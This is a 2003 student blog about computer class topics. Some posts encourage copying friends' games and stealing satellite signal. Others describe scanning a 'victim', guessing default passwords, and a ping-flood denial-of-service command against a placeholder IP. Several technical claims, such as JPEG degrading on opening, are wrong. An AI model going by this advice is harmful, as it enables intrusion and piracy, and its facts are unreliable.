@@ -1,0 +1,1114 @@
+<Blog>
+
+<date>13,January,2003</date>
+<post>
+
+	 
+      JPEG   JPEG stands for Joint Photographic Experts Group and has .jpg file extension. JPEG is one of the image file formats that are supported on the World Wide Web. It is the most common image file format used today, for that matter, it is important to know a little about it. If you keep opening and saving an image JPEG file, then it will loose its quality, sharpness, and clarity, for that matter, don’t open it more than once, or you’ll have a very lousy image. JPEG images can hold up to 16.7 million colours that would be best if you have photographs or other complex images. As I mentioned before, JPEG is a very bad compression that looses quality every time saved and restored. For that matter, you have to think about what images you would use it on. Good for photographs, bad for black and white images (Who needs 17 million colours in black and white image!).   GIF  GIF stands for Graphic Interchange Format and has .gif file extension. It is also used plenty on the World Wide Web. You might ask how is it different from JPEG? Well it only supports 256 colours (not good for complex images), unlike JPEG with 16 million. But images with GIF format will not loose any quality when you open it and save it. GIF is also good to be used with black and white images that do not require a lot of colours. If you have an animation editor, you can make videos from your images (animated images). Transparency is also a function in GIF that allows you to make the background transparent so the background colours in Web pages could show through. GIF format should be used with logos, line drawings and icons. It is bad for photographs and images with long tones of shades.   PNG  PNG stands for Portable Network Graphics and has .png file extension. PNG images could also be found on the Web, but are not supported by all browsers (Internet Explorer 4 or Netscape 4). PNG was generally made to improve the GIF images. Although PNG does not support the animation like GIF, it build on the transparency. You could now change the amount of transparency in your images, also known as opacity. PNG images will not loose their quality by saving and restoring. PNG provides greater depth of colours on images, up to 24 bit.  BMP  BMP stands for Bitmap images that have .bmp file extension. BMP is a ordinary image format mostly used on the Microsoft Windows platform. Supports up to 16.7 million colours, and uses a pixel map to show images. The image data is saved with 8 or 24 bits per pixel without any compression. Bitmap is a brilliant choice to photographers because of its outstanding photo quality. Its downside is that it occupies a lot of disk space, and is a long time to download (that’s why you don’t see it much on websites). Bitmap images could also have an extension .dib.   TIFF  TIFF stands for Tag Image File Format and has .tif file extension. TIFF has been around for a long time is one of the most popular and extensively used file formats for storing bit-mapped images. TIFF is commonly used in image editing software because images could be at any resolution, and can be black and white, grayscale or color. TIFF is more general that GIF and allows 24 bits per pixel. It supports five types of image compression, like RLE (Run length encoding), LZW (Lempel-Ziv-Welch), and JPEG (Joint Photographic Experts Group). You probably won’t use TIFF unless you intend to and you know how to use it. TIFF images cannot be set in Web pages and viewed from web browsers, but you could view them in programs like Adobe PhotoShop. TIFF images are high quality (like PDF), lossless format, not compressed, and is used to store the “master” copy of images used in photography. TIFF images are typically between 200 to 700 KB in size. 
+     
+
+    
+</post>
+
+<date>29,September,2003</date>
+<post>
+
+	 
+      Did you know that you could burn(I don't really mean "burn" but rather copy) a game or a movie on to another disk?Not everybody have a CD burner, but if you do, then it is very useful. You could borrow you friends' games and burn them without even buying them! When burning CDs, the laser is no longer red but is white, much more powerful.
+     
+
+    
+</post>
+
+<date>23,September,2003</date>
+<post>
+
+	 
+         Generally speaking, a CD(Compact Disk) is a piece of plastic that holds about 700MB or maybe 80 minutes of music. You can find CDs almost everywhere today.Not long ago, a new type of a CD came out called a DVD (Digital Versatile Disc) which is almost the same thing and but is much more powerful and holds a greater amount of data.    To be able to read a CD, you need a drive motor that spins the CD, then the laser focuses on it and reads the bumps.(every CD has bumps that are read by the laser). People use CDs for almost anything, games, music etc. DVDs are mostly used for watching DVD movies in you DVD player or on you computer, if you have DVD ROM.
+     
+
+    
+</post>
+
+<date>23,September,2003</date>
+<post>
+
+	 
+      Binary is the language of computers. Binary numbers could be from 1 digit to infinity. A single binary is called a bit (short for  b inary digi t ). 8 bits make a byte. Reading in binary is quite easy, just remember this chart so you  could find our any binary number: 128 64 32 16 8 4 2 1   128 64 32 16 8 4 2 1    1    0   0   0  1 0 1 0  For example, the binary number 10001010 is 138, because you just add the numbers ubove the 1's. How about 11100110? If you do the math you'll get 230=128+64+32+4+2                                                        /128 /64 /32 /16 /8 /4 /2 /1                                                      /    1  /1   /1   /0  /0 /1 /1 /0   Easy HUH?   
+     
+
+    
+</post>
+
+<date>22,September,2003</date>
+<post>
+
+	 
+      Computer components are like computer parts such as a hard disk and  a graphics card. Our project soon will be to learn about these things and I know somethings about computer components already, but I would really like to learn more about them because I might even become a computer mechanic. Some examples:  RAM:stands for Randon Access Memory. Processor: Intel Pentium CD ROM: stands for Compact Disk Read Only Memory, it reads               the disk and lets you play games or something.   
+     
+
+    
+</post>
+
+<date>22,September,2003</date>
+<post>
+
+	 
+      A worm is similar to computer virus, in other words it is self-replicate. The difference is that virus attaches it self to other executable files unlike worm is self-contained, it does not need to be a part of something. Worms could delete your files and send them over net so they are very dangerous. Some examples of worms could be like an upgrade to your system, therefore it won't damage your system.
+     
+
+    
+</post>
+
+<date>22,September,2003</date>
+<post>
+
+	 
+      Making viruses could be fun, but you would have to know a lot of computer programming such as VB Script, Pearl, JAVA Script or Asembly. However, if you would accidently realease the virus, than you would be arrested. I personally find that Assemby is the best virus writing language because it doesn't give the victim time and just destroys the computer. 
+     
+
+    
+</post>
+
+<date>22,September,2003</date>
+<post>
+
+	 
+      Hacking is a really bad thing to do, but if you could do it then you're really smart in computers. I find hacking too hard because you have to know so much stuff like computer codes as well as write your own applets. Just last week, I got a virus in my computer but it didn't infect anything yet so I just opened it for fun knowing that my Norton would fix it. It infected some of my files and was really easy to fix. Soime viruses could be very hard to find and fix that it would infect your whole computer without you knowing it.
+     
+
+    
+</post>
+
+<date>22,September,2003</date>
+<post>
+
+	 
+          At Mr.Case's class, we have to help our clients to find a computer that suits their needs. I found it hard to make the research and find out the comparison on the system and prices in all the computer business like dell, future shop and best buy.      A university student may want a powerful and upgradable system that could handle great graphics. A business company may want a computer with a big hard drive and a first time computer couple may want a  computer that is easy to use so they could surf the net and chat online.      Now I know why that its not easy as it looks when someone is trying to find a computer for you.
+     
+
+    
+</post>
+
+<date>11,September,2003</date>
+<post>
+
+	 
+      Being a doctor requires a lot of medical experience. I want to be a good doctor that does work and gets a lot of money. Doctors are the ones that save peoples lives and plus its really good to have experience because you never know when you get in that type of situation where someone is hurt oor something like that.
+     
+
+    
+</post>
+
+<date>09,September,2003</date>
+<post>
+
+	 
+      One of the careers usefull in life is being a mechanic or electrician. I like to be mecanic in the future because I will get to fix different types of machines. If something breaks in my house like a table, door or even the toilet. I would be able to fix it without a problem. I wouldn't waste money on calling a plumer or whatever. I will of course, need to have extensive experience. Electrician is a very cool job because you could get paid for not doing much. You get to fix the electricity wires and systems, to make the electricity flow. Someone may call you to fix their light and all you have to do is connect a wire or replace some battery and they pay you money. You can even make yourself a free satelite and steal satelite signal because they charge you too much for it. Make movie network free and everything else.
+     
+
+    
+</post>
+
+<date>04,September,2003</date>
+<post>
+
+	 
+      Jobs are like careers so you have to choose carefully. I would be a spy. I like dangerous missions and I like spy movies. Being a spy is pretty hard, but I'm prepared to take consequences. There will be intense training including sniping and fighting. I will meet women and maybe even save the world.
+     
+
+    
+</post>
+
+<date>04,September,2003</date>
+<post>
+
+	 
+      Hey,          My name is Nick. I'm 14 years old and I go to Woodbine Junior high School. I think computers are fun because they're not hard to learn about and its really fun to make viruses and crash peoples computers(just kd). I find writing codes and making web pages fun. Writing letters to somebody using word or just typing in the box at your e-mail accout is just really convinient. Mr. Case is my computer teacher for grade 9 and i think its gonna be fun.          The future of computers is really important because our lifes become easier. Without computers life would  really different if you don't take anything else away. Many, many jobs require using computers because its much easier.
+     
+
+    
+</post>
+
+<date>30,October,2003</date>
+<post>
+
+	 
+      Influenza is a virus that multiplies in the human respiratory system. It is also known as a flu but its different from a common cold. It could be spread by coughing and sneezing. The virus can enter the air and if person will inhale the air he might get the flu as well. You should definitely rest and drink lots of liquids like juice. Some symptoms of influenza are fever, headache and feeling dizzy. The symptoms appears a day after you get the virus or maybe even five. Examples of influenza diseases worldwide are the Spanish Flu, Asian Flu and Hong King Flu. The information was taken from the  urlLink CDC Website 
+     
+
+    
+</post>
+
+<date>28,October,2003</date>
+<post>
+
+	 
+          Windows Me is concidered perfect for those who have Windows 98 and want to upgrade. I got mine not a while ago and I love it!
+     
+
+    
+</post>
+
+<date>23,October,2003</date>
+<post>
+
+	 
+           Microprocessors are better known as CPU, or central proccesing unit. There are many types of microprocessors like Celeron and Pentium 4. Microprocessors keep getting better and better because our technology keeps evolving. Computer engineers may use the assembly language to make the processor better in quality and speed.  Microprocessors have three properties that will help us distinguish between them. They are instruction set (instructions that tell the processor what to do); bandwich(the total number of bits processed in a single instruction); and clock speed that tells you how many instructions the CPU can do per second, given in megahertz(now days its GigaHertz because it is so fast)
+     
+
+    
+</post>
+
+<date>23,October,2003</date>
+<post>
+
+	 
+      Hexadecimals are base 16 number systems( 0-9 and A-F) that are used by the computer processors to define colours as numbers. Computers can't understand pink or green, but they do understand codes like 00FF00 or 00A53C. All colours are a mixture of three primary colours; red, green, and blue. A hexadecimal color uses a six- digit number. The first two digits are the value for red, the next two for green, and the last two for blue. This process is called RGB (red green blue).  You have 256 possibilities for each color, so the total combination of colors would be 16 million! If you have the lowest values: 000000, the colour would be black, and if you have the highest values, the colur would be white. So you see, mixing colours in computer codes are completely different from mixing the colours from paint, because you are mixing light, and not paint. To find out the hexadecimal value of 176 red, 32 green and 32 blue you need to divide each one by 16 so it will be 11 2 2 that is equal to B 2 2 so the final    answer would be B02020, follows in a sequence;  quotient, remainder (red)     quotient, remainder (green)     quotient, remainder (blue)
+     
+
+    
+</post>
+
+<date>23,October,2003</date>
+<post>
+
+	 
+                   Trojan horse is a dangerous program that can damage your system. Trojans are often called backdoors. It could be downloaded to keep viruses away from your system, but instead it introduces viruses to your system. If you run a Trojan file it will install itself on your computer to get run every time you turn on your machine. Trojans opens a port (channel) on your system, which can be used by an attacker to connect to your computer. Trojans can allow almost everything for an attacker to do harmful things like viewing, modifying, and deleting data, watching you when you are working or surfing the web, so like spying.               The term comes from a story in Homer's Iliad, in which the Greeks give a giant wooden horse to their foes (Trojans) as a peace offering. But after the Trojans drag the horse inside their city walls, Greek soldiers sneak out of the horse and open the city gates, allowing their companions to come inside and capture the city Troy.               
+     
+
+    
+</post>
+
+<date>22,October,2003</date>
+<post>
+
+	 
+      Code Red Worm is a worm that spread over computers and replicated itself over 250,000 times in just 9 hours on July 19th, 2001. A worm is a program that can copy itself from computer to computer usually through a computer network like Internet. The Code Red worm was designed to do three things: Replicate itself for the first 20 days of each month, replace Web pages on infected servers with a page that declares "Hacked by Chinese" and launch a massive attack on the White House Web server in an attempt to overwhelm it. If you would like to try and understand Code Red Worm structure then click  urlLink here  to see the source code.
+     
+
+    
+</post>
+
+<date>21,October,2003</date>
+<post>
+
+	 
+      Inside every computer is a hard drive disk which holds data. Today, computers hold a tremendous amount of data, as high as 300 Giga bytes! Hard disks are sort of like floppy disks except they are fixed in the computer, in other words, you can't take it out. It is a cirtular disk that rotates certain number of times per minute(normaly 7200 or 5400 RPM). It uses magnetic recording material to store your information, capacity refers to how many bytes fit on a hard drive. Click here to go to the website  urlLink >>>click me!!! 
+     
+
+    
+</post>
+
+<date>20,October,2003</date>
+<post>
+
+	 
+      If you own a computer, its essencial that you have a graphics card that could support you video, animations, etc. Graphic card takes the digital information and turns it into something visual like pictures and videos. If you have a game, having a different graphic card will affect the visual display. Radeon is an example of a powerful graphics card. Graphic card may also be called a video card. Click here to go to the website  urlLink >>>click me!!! 
+     
+
+    
+</post>
+
+<date>20,October,2003</date>
+<post>
+
+	 
+      Most of you have heard of a new monitor called LCD Monitor. The main difference between LCD monitor and normal monitor is that it is much flatter and thinner. LCD stands for Liquid Crystal Display so that tells you that monitors use liquid crystals to display data. You can find these in TV, laptaps and much more. Liquid crystals were first discovered in 1888, by Austrian botanist Friedrich Reinitzer. The only down on LCD is that its fairly expensive and the graphics tend to get worse than in CRT monitors.               Click here to go to the website   urlLink >>>click me!!! 
+     
+
+    
+</post>
+
+<date>20,October,2003</date>
+<post>
+
+	 
+      The computer presentation are being done now and I will write a brief notice and review on the information that each group presented. The computer components that will be included are; 1: Hard drives 2: Memory (RAM and ROM) 3: CRT Monitors 4: LCD Monitors 5: CD R(RW) Drives (my group) 6: Graphics Cards 7: Microprocessors
+     
+
+    
+</post>
+
+<date>11,October,2003</date>
+<post>
+
+	 
+                I think that it’s great to be able to purchase your favorite songs and albums right from your computer. A lot of people use Kazaa, Mobeus, Limewire, or other such peer to peer sharing programs to be able to download music files without paying a dime to anyone that deserves it. This is a very serious crime that majority of people don't bother to do anything about it. It is illegal and you can get caught and send to jail.       By using this new program Puretrack, however, you would be able to download all you want and not thinking Am I gonna get caught?You can visit them on the website  urlLink www.puretracks.com . This is a new way to download music, which many people will enjoy using. This new and improved option not only lets you to choose from a variety of different songs, albums, music, artists and let you get it cheaper, but the artists will also get a piece of the pie, as they are the makers of music and are responsible for it. This type of thing is only going to improve music, so don’t hesitate to try this cool way of getting hold of what you want.        This program just came out, and you’d just wish that it would have come out sooner. I personally recommend that everyone tries this new way of downloading music, even if you buy CDs. Downloading of course is a hassle, because you will have to wait for it to download (depends on your Internet Service) and then burn it on a CD in order to play the music on your disk player. Buying CDs is definitely a better way of getting albums if you don’t have Internet or computer, but having Internet, allows you to obtain the songs or albums you want at a lower price without leaving your house. This is especially useful when you live far away from the city or a local store. CDs on the other hand are more expensive and you need to look for a store that has your favorite albums and/or artists. Final word? A must to have for music lovers and fans.       
+     
+
+    
+</post>
+
+<date>11,October,2003</date>
+<post>
+
+	 
+      .model small .stack .data message   db "Hey Mr.Case!!!", "$"  .code  main   proc    mov   ax,seg message    mov   ds,ax     mov   ah,09    lea   dx,message    int   21h     mov   ax,4c00h    int   21h main   endp end main  It may seem confusing at first but it is just the beginning of Assembly language.
+     
+
+    
+</post>
+
+<date>09,October,2003</date>
+<post>
+
+	 
+      One of my favorite languages is Assembly. It is very complex and is very hard to learn, but once you now it, it could be used very powerfully. Assembly is not just a programming language but its more in depth of the hardware. You need a linker, debugger, and any text editor like notepad. Assembly is widely used by a lot of people  especially , those who make .exe and .com viruses. Since assembly is very difficult to learn, they teach it in university or after college. Assembly uses registers, each with a specific purpose, to program. Yu can change them or manipulate them in any way that you want. There are segment registers, pointer registers, general-purpose registers, index registers and flag registers. mov ah,09 =moves the 09 value into ah register.  int 21h= causes interruption .stack=is used to store temporary data
+     
+
+    
+</post>
+
+<date>07,October,2003</date>
+<post>
+
+	 
+      Port Scanner is an essential tool in hacking. It lets you find open port on you host, or rather your victim. However, running a scan on your host will most likely cause you to get caught. The first thing in hacking is that you need to gather as much information on the host as possible. Using a stealth port scanner will leave you undetected, but there is still a chance that you'll get caught, and the first rule is hacking is not to get caught. You can code a port scanner using C, but it might be too hard for you, so I suggest you download one and code it yourself. Since hacking is illegal, you shouldn't damage your target's system, so I'm not responsible for what you do. You can hack a server by hacking the password, so just use a crack or try a default password like root login, etc.
+     
+
+    
+</post>
+
+<date>07,October,2003</date>
+<post>
+
+	 
+          Did you ever create a web page? I mean did you ever use html tags to create a nice looking web page with cool links, pictures, information and maybe a little music. You should always start with  html  and end with /html. Make sure to put it in between the tags  Type in title../title to make a title that you want your web page to have, it will appear on the top of the browser.(you need to do it in between head and /head tags. Now start putting in information in between the body and /body tags. To make text bold simply put it in b and /b tags, and to make a heading, put in h1 to h6 tags. Like h3.../h3. Sounds easy right, so get to it! 
+     
+
+    
+</post>
+
+<date>01,October,2003</date>
+<post>
+
+	 
+            Many people have used Microsoft Word to type in their report, letter, fax or whatever they need. Student now practically use Word in every type of assingment they get. But have you ever used Microsoft Powerpoint? Many people have heard about it, but never used it before. Those who used it might have found it difficult. Mr.Case taught us a little about Powerpoint and what can be done with it and where it could be used, like if you're doing a research project. I found it really cool because you can include slides, pictures, music, visual and special effects in your presentation, so basically, you can make your presentation anything you want, since Microsoft includes it with so, so much options and choices that you'll find total control over you project.        Using  Microsoft Powerpoint can be a little confusing at first, but you'll find it quite easy when you have played around with it a little bit. Try to do a fun project to really grasp the aspect of Powerpoint because it could really come in handy in the future, especially when you consider your career in business or computers. 
+     
+
+    
+</post>
+
+<date>01,October,2003</date>
+<post>
+
+	 
+      Have you ever downloaded MP3 files from the internet? If you did, then you would be doing something illegal. Downloading music from the internet is basically the same thing as stealing CDs from the store. People also download movies, games, software and other things, but they don't realize that its not right and its illegal. Say that you created an anti-virus program that you worked really hard on and put it on many CDs, and selling copies to people. You would buy about a million CDs and sell it to million people around America, and get a lot of money. Now think that it takes one person to ruin your bisiness. All they have to do is share it on Kazaa and other people will download it until everyone will get a copy of your program for free! Just because you think that you won't get caught, doesn't mean that you could do something illegal. If you buy something thats copyright, then you are allowed to use it,  not own it . Of course you could tape movies from the television, and watch it again, but you can't make copies and sell it to people. 
+     
+
+    
+</post>
+
+<date>30,November,2003</date>
+<post>
+
+	 
+      No, using PowerPoint is an astonishing thing that presentations need, and using it will only make our economy stronger. While reading the article “death by PowerPoint”, I did in fact notice all the bad things about PowerPoint that it said were somewhat true. Who would be able to sit through a 120-slide PowerPoint presentation without being bored? That does not however mean that we should stop using PowerPoint because some people think so. In my opinion, PowerPoint is a very good tool to use in presentations, because you could add graphics, pictures, as well as animations. You could create a background song so it’s more appealing. There are so many thing you could do, it would be impossible someone having the same presentation as yours. Linking other documents in the Word, Excel, Access, and/or FrontPage is also a possibility if you want to get extra-creative. For example, if you have an Excel project and a Word document file, and you wish to do a PowerPoint presentations including those two, you could do that without typing the info all over again, but linking the info right into your PowerPoint presentation (if you happen to make changes to Excel or Word documents, it would change on the PowerPoint presentation as well!). I agree, however, that not all presentations would be interesting and successful. You have to practice and exercise you presentation in order to achieve high standards. By simply looking over a PowerPoint tutorial on the Web could make a big difference in your presentation. You want your audience to be a part of the presentation, so why not ask some questions and put some trivia in your PowerPoint for that spicy flavor. But remember, adding too much spicy could ruin your presentation in lack of organization, creativeness, and neatness. So I hope that you learned something from this post about the PowerPoint presentation and that you are thinking about preparing your PowerPoint skills. As I have said before, PowerPoint is a great way to do any kind of presentations, as long as you know what you are doing. Adding extra things like slide and text animations of sound effects could make your presentation better, or just annoy the audience. So you have to make sure that your presentation is balanced and creative.
+     
+
+    
+</post>
+
+<date>23,November,2003</date>
+<post>
+
+	 
+      C is a programming language that can give you an in depth view at windows. It gives you the ability to write programs and make them do  what  you want. You could do alsmost anything with C. Here is a sample of a C program that will display afriendly message. There are about a million ways to write this same program, but this way is the most easy for me. --------------------------------------------------------------------------------------- #include stdio.h #include conio.h  void main() {                      printf("Hey students of Woodbine!"); } ---------------------------------------------------------------------------------------
+     
+
+    
+</post>
+
+<date>11,November,2003</date>
+<post>
+
+	 
+      DHTML stands for Dynamic Hyper-Text Markup Language. It is used to add more things on your website like games and special effects. Of course you have to learn it in order to be a successful programmer. The are lots of things that web designers use to create web pages and DHTML is one of them. Some others one include HTML(duh!), XHTML, CSS, VBS and Javascript.
+     
+
+    
+</post>
+
+<date>10,November,2003</date>
+<post>
+
+	 
+      Lord of the Rings is the greatest movie ever because of its enriched storyline and amazing special effects. The next movie will be called  The Lord of the Rings: Return of the King   I'm sure everyone will get a chance to see it, maybe even  you ! Disagree? Then check it out:     {pictures will be added soon}   
+     
+
+    
+</post>
+
+<date>10,November,2003</date>
+<post>
+
+	 
+      Everyone loves a good hardcore action/adventure movie. Most of them have special effects and incredible computer animations. Matrix Reloaded is one of the movies that has bounty of computer special effects and graphics. I think they're the best to do it. Lord of the Rings trilogy has some amazing graphics effect and with it everything else. So you might ask how the do it? Computers are the answer.  Computer Graphics programmers work as a team to make a computer based character or object moving, or even fighting. They use special programming languages that you have to learn and study and practice for a very long time in order to create the magic these movies have:           If you happen to experience problems viewing these pictures, then your Internet Provider might now able to handle it. please upgrade to Internet Explorer 6 or Netscape 7.      
+     
+
+    
+</post>
+
+<date>10,November,2003</date>
+<post>
+
+	 
+       Every time you or your friends go to see a movie you probably seen the preview before the movie about piracy. If you haven't, then its just basically about how hard everyone worked on the movie- actors,producers,directors,screenplay writers, chorographers, special effect designers, on-set designers, construction guys, dress designers, stuntmen, etc. I too think it wrong to download and burn movies because then veryone will be ripped off. Check out my next Blog and I'll talk about how special effects and computer graphics work in movies like the Matrix and the Lord of the Rings.    
+     
+
+    
+</post>
+
+<date>10,November,2003</date>
+<post>
+
+	 
+       I have recently found out that Microsoft has a very low security post, which gets hacked every time. Update regulary at windowsupdate.com.
+     
+
+    
+</post>
+
+<date>10,November,2003</date>
+<post>
+
+	 
+      Java is widely used by everyone, because most web pages that we visit require java applets. You can download one from  urlLink http://java.sun.com . Java can also be used as a programming language. You have to download a special program in order to be able to write your own friendly or destructive applets. Here is an example of a very simple, simple Java program.  public class HelloWorldApp {     public static void main(String[] args) {         // Display "Hey boys and girls!"         System.out.println("Hello World!");     } }  The applet above will simple display the message "Hey boys and girls!" on your screen. You can type it in notepad and save it as a file with ".java" extension. Then you could open it at MS-DOS prompt. Of course you'll need a compiler to make the .exe file. While writing programs, you will most likely make mistakes known as  bugs . That's why compilers have  debugging  to fix them. Java applets have lots of complex codes like variable and looping. Your programs and applets can do a lot of things like displaying text, playing sounds and even make a java Trojan (java Trojans aren't that dangerous because they are often stopped by your internet provider and they are very slow in attacks.)
+     
+
+    
+</post>
+
+<date>06,November,2003</date>
+<post>
+
+	 
+      Excel is a great Microsoft program that help you create graphs and charts, in making great professional presentations. Excel is like a spreadsheet (paper ledger sheet), with a grid make from rows and columns, with cells, where you type in the required data and values. Excel is  very  easy to learn and use. It could make and solve formulas for you. For example, suppose that you want to find the average number of the numbers in the same row or column. You can go to function and commonly used formulas and click average. It will display a formula and you could use that. The computer will automatically figure out the answer, even if you do change some things in the values in the rows. You can insert graphs and put them in your other presentations like PowerPoint and/or Word.  You can use the Chart Wizard in order to create a graph that you most likely will want to use, such as a bar graph or pie graph (both very easy to make and understand).  Cells are intersections of rows and columns. You can put labels (text strings), constants (number data and string) and formulas to figure out a sum or average of large or little amount of data. Take this quiz to learn how much you know about spreadsheet Excel; advantages of spreadsheets- the first thing in equation must always be______ cell F5 means refers to: row____ column____ three types of data found in a spreadsheet are;  If you had any problems or difficulties with this test, please talk to Nick!
+     
+
+    
+</post>
+
+<date>06,November,2003</date>
+<post>
+
+	 
+      	Not a while ago, I have purchased Norton’s Internet Security. It cost me well over $60.00, but it was worth it. Symantec’s Norton Internet Security 2004 comes with a lot of new features and a variety of options. It includes an AntiVirus, Personal Firewall, Privacy Control, AntiSpam and Productivity Control. It generally protects my PC from virus threats, blocks hackers, and could recover a lot of important data, as well as erase the unneeded files from my computer. It also comes with LiveUpdate, where you can download necessary updates that are released from time to time. 	I bought this product because it is important, and essential to any computer. I would personally recommend this to everyone who use Internet. Thanks to Symantec’s upgrade abilities, you could upgrade your version to any that you like. You have to pay of course, but it saves you money and time. For example, if you are using Norton System Works, and want to get Norton Internet Security, it would only cost you $39.99, like I said, it saves you time and  a lot  of money.                  Symantec enables you to buy their products cheaper if you already bought one of their other products. Upgrading your package would of course add up less that buying a new package all together. There are lots of other Symantec's products available for you to get like Norton Ghost, Norton AntiVirus Professional and Norton Personal Firewall. The package I got, Norton Internet Security 2004, would have a newer version until a long time. I could save lots of money buying other Symantec products or upgrading my current package for a lot less money. These are all incredible advantages that make your life and your computer's life much easier, but however, there are some big disadvantages as well.              I have learned a few things from my experience using Symantec products. First of all, when you buy the package utility that you need, you would need to buy the newer version of the product until a long while. Why would you upgrade your product if the new version serves the same purpose, but just has a different style and a  few  other things that aren't even worth mentioning. LiveUpdate already enables you to download new updates for your product for free so why would you want buy a new product? You only need to upgrade your package in about five years or perhaps less, depending on the new product overview. The cost of the newer version is not even funny, even if you have the previous package, it would still cost you a bundle.                 As I said before, Symantec allows you to buy their products for less if you bought something from them earlier. It may sound like a good deal, but its not. Symantec's products are mostly all worthless except for the AntiVirus and Firewall- the only things that you need for your PC to protect it. Only those people who love their computer so much would buy the products for less, not caring about the cost, and smart thinking.                 So from now on, think twice about upgrading your product. Even if it's worth less, you still may be getting ripped of. Ask your self these questions;  Do I really need this upgrade? Can I wait until the next version? Is the overview of the new product practically the same as mine?  . You may only discover the difference after working with the products several months. The company only wants to let you think that you are getting a good deal while you are buying a whole lot from them that isn't necessary. I mean if I had a business, I would try to do the exact same thing. There are a lot of people who may be all brains and no money. I'm not saying that Symantec is a bad company, I'm just saying it is  just like any other company.  Don't trust all that advertising because it would sell anything. Trust your instinct. Saving a lot of money doesn't mean you have to buy the products right away. Check the product's features and overview. If you think it's a good deal for you, then buy it. Don't spend all your money on the same product; search other companies and other packages. It may take time, but it might save you a whole lot of money. I hope you learned something from this article.    Package of Norton Internet Security 2004 
+     
+
+    
+</post>
+
+<date>25,December,2003</date>
+<post>
+
+	 
+                       Hey people, merry jolly christmas to you all. Hope you got a lot of presents that you like. New Year is coming soon so be prepared for that. Make sure you all study for the exams that will be happening soon after the holidays. I have already done nothing and won't be doing nothing for the rest of the week. The last week of holidays, I'll try to summarize everything that I have learned this year and make notes of what I don't understand (Uggghhhh, Science!!!). Anyway it's my sister's birthday tomorrow which is the 26th of December and she's just turning 2 years old. What that you say? Oh thank you very much, I know she's a great girl. By the way, not much snow this christmas, huh? :(      Well Christmas is old news, now its the New Year 2004!!! HOpe you all had a fantastic time, because its the time to get in touch with your family and have a nice dinner followed by those embarassing family games. In fact, I had the greatest time ever. There was lots of food- cheese cake, normal cake, pie, tea-biscuits, and there were cool gifts, but I cannot tell you cause its family. Well later days, see ya'll in skewl.
+     
+
+    
+</post>
+
+<date>14,December,2003</date>
+<post>
+
+	 
+      About time that Saddam Hussein was finaly captured. They found him in a farmhouse hole near Tikrit. Now we won't have to worry much about him. President George Bush was on live television saying something about him. You can check out the full article about the capture on this  urlLink website .    
+     
+
+    
+</post>
+
+<date>12,December,2003</date>
+<post>
+
+	 
+      I think that Microsoft Word is the most common and easiest word processing tool. No wonder so many sites have an online tutorial about it, so people could easily learn to use it and get help with anything. The web site that I think does the best job of proving help for new users, has a lot of information, easy to understand and has step-by-step instructions on how to do thing in Word is the BayCon Group website. You can visit it at  urlLink http://www.baycongroup.com/wlesson0.htm . It will display the Word Tutorial Table of Contents. I think that everyone will like this site because it taught me a lot, like how to format and make tables.   I first found out about this site by going to the AltaVista website and searching for "word tutorial". It displayed it at the top because most number of people have visited it, than any other site of that choice. If you read my Search Engine article then you'll know why.  Microsoft Word tutorial is very easy to understand and use as an example when trying it out on your own. I would recommend it to a nyone , even to teachers and parents. It is  very  helpful and useful in learning Word. You could also use it as a reference, if you just want to wind though it so you know everything perfectly.  When I was writing the Word Project, about five things that I would like to know more, I found the site very useful. It provided me with all the answers and knowledge that I would ever ask for. If you don't understand it, then I think you'll have to experiment with Word youself first. If you never used Word before, do so before reading this site. You could also do the exercises yourself so you'll not only memorize it, but you will know it automatically when writing a document.
+     
+
+    
+</post>
+
+<date>11,December,2003</date>
+<post>
+
+	 
+      I saw Andrei's blog and its clear to me that people don't quite understand hacking. May I say that it is not like bank robbing and is not illegal the way that some people and I do it. Please read my short article on "Hacking" in my blog to find out more. Trust me on this, I will never get arrested for doing such things, but you can. So please don't try to do anything that you hear from somebody or read from somewhere. You will get sued for $250,000 just for an attempted attack, even if you wouldn't actually do anything. So it is a  very  serious crime, mind you. Disclaimer: I will not be responsible to what you do with the following information, it is illegal to try it in somebody and I'm only writing this to providing you with computer educational experience. Click  urlLink here  to view the document.
+     
+
+    
+</post>
+
+<date>10,December,2003</date>
+<post>
+
+	 
+      Introduction  You might wonder what exactly is hacking and how it affects you. Hacking is a way of breaking into somebody’s system, now that doesn’t mean that you have get their personal passwords or credit card numbers. You can simply check errors in their system, like their connection or security issues. A lot of people think that hacking is very bad, but I don’t think that. Without hackers, we wouldn’t be advanced in computer technology as we are now. Hackers could make anti-viruses, registry and disk tools, and invent programming languages that we take for granted. Hacking itself is not illegal, but breaking into someone’s computer without their permission is. Hacking could be as simple as finding someone’s IP, and viewing a source code of a website, or as complex as breaking someone’s firewall, opening holes and cracking the password of a server.  How to Hack?  Hacking could be very difficult in terms of understanding the computer technology and terms. However, some hackers just download a popular Trojan and use it to crash or break into someone’s system. Hardcore hackers are practically untraceable, while noobs get traced and arrested. You can launch a DOS Attack (denial of service attack) on someone’s system or server to crash or shutdown their system. One of these is the buffer overflow, of ping of death. You just keep pinging the victim, sending him millions of pings repeatedly until their connection is hung up. You have to find the target’s IP (internet protocol) address is order to achieve this. Go to MS-DOS, and at the command prompt, type: c:\windows>ping –l 65500 123.45.67.89 –t. Of course I would never recommend doing this because it’s very stupid and is almost always blocked by firewalls and packet filters. However, some companies do these kids of attacks on other company’s computers to shut them down. The U.S army may shutdown other countries computers when launching an attack or something. There are lots of different DOS attacks including; SYN attacks, UDP flooding, smurf attacks and teardrop attacks.   If you want to really get in depth, like connecting to somebody’s ports or closing them then you could do a simple portscan on their IP address and get the information that you need. When you have found the information that you need, then you could hack. Go to MS-DOS and type in the command c:\windows>telnet 123.45.67.89 25. This simply means that you wish to connect to the target’s smtp port that is currently open. Other ports that are worth mentioning are: 21-FTP 23-Telnet 25-SMTP 53-DNS 79-Finger 80-HTTP 110-POP.  You might ask how do you find someone’s IP? Well, you have to establish a direct connection between the client and the host. You could do this by playing a game, or chatting on an instant messenger. Go to MS-DOS and type in this: c:\windows> netstat /? for the list of commands. Types in netstat –n to get all the connections that you have online. The bottom one should be the one that you want. This is especially useful when you want to check for Trojans on your computer, because they always keep an open port every time you connect to the Internet, ready for the attacker to connect. Even if you have an anti-virus, it won’t detect the Trojan that’s installed on your system. Common Trojans are SubSeven and NetBus. If you see any of the following, then you can be pretty sure that you are infected:   Port 12345(TCP) NetBus Port 31337(UDP) Back Orifice  Other methods of MS-DOS hacking that are commonly used are; 1) NetStat 2) NbtStat 3) NetCat 4) Ping and Tracert 5) Telnet and Nmap  Viruses  Viruses also pose a very dangerous threat to our seciety. Recent anti-viruses had been able to protect against them but it is impossible to stop them all since people all over the world read their e-mail. Viruses could be in games, sites, 